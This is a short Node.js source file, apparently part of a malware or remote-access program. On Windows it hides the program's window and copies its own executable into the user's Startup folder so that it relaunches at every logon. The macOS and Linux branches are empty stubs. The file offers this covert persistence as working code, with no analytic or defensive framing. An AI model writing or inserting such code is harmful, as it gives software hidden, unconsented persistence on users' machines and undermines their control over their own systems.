const fs = require("fs");
const config = require("../config");
const identification = require("./identification");
const hideWindow = require("./hideWindow");

function windowsInstallation() {
  const targetFile = `${process.env.APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${config.common.binName}.exe`;
  try {
    if (!fs.existsSync(config.windowsInstallPath)) {
      fs.mkdirSync(config.windowsInstallPath, { recursive: true });
    }
    if (!fs.existsSync(targetFile)) {
      fs.copyFile(`./${config.common.binName}.exe`, targetFile, (error) => {
        if (error) {
          console.log(error);
        }
      });
    }
  } catch (error) {
    console.log(error);
  }
}

function installation() {
  if (identification.platform === "win32") {
    hideWindow(config.common.binName);
    windowsInstallation();
  } else if (identification.platform === "darwin") {
    return "";
  } else if (identification.platform === "linux") {
    return "";
  }
  return "";
}

module.exports = installation;
